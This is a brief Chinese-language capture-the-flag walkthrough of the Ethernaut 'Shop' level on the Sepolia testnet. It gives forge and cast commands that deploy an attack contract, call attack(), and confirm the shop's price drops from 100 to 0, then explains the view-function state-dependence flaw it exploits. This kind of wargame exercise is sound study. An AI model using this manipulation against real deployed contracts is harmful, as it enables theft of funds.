# 22-Shop
```
1. 部署攻击合约
forge create src/22-Shop/ShopAttack.sol:ShopAttack \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --constructor-args $Shop_ADDRESS
Deployed to: 0x55DE24a1E7B826DD1614b3B968E7E26D929c5529
2. 验证初始状态
# 检查初始价格
cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
# 输出: 100 (0x64)
# 检查是否已售出
cast call $Shop_ADDRESS "isSold()" --rpc-url $sepolia_rpc
# 输出: false (0x00)
3. 执行攻击
cast send $ShopAttack_ADDRESS "attack()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    -vv
4. 验证结果
# 检查最终价格
cast call $Shop_ADDRESS "price()" --rpc-url $sepolia_rpc
# 输出: 0 (0x00) ✓
```
### 考察点
- 状态依赖
- view 函数不能修改自己合约的状态,但可以读取其他合约的状态
- 如果其他合约的状态改变，view函数的返回值也可以随之变化